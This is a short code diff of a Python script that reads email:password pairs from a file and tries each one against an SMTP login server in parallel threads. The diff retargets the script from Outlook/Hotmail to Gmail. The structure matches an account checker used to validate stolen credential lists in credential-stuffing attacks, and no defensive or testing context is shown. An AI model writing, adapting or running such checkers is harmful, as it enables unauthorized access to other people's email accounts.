@@ -2,9 +2,9 @@ import smtplib
 import traceback
 import concurrent.futures
 
-def check_hotmail(email, password):
+def check_gmail(email, password):
     try:
-        smtp_server = "smtp-mail.outlook.com"
+        smtp_server = "smtp.gmail.com"
         smtp_port = 587
         # Set a timeout to prevent it from hanging
         server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
@@ -24,7 +24,7 @@ def process_accounts(file_path):
 
     def handle_account(line):
         email, password = line.strip().split(":")
-        response = check_hotmail(email, password)
+        response = check_gmail(email, password)
         return response
 
     with concurrent.futures.ThreadPoolExecutor() as executor:
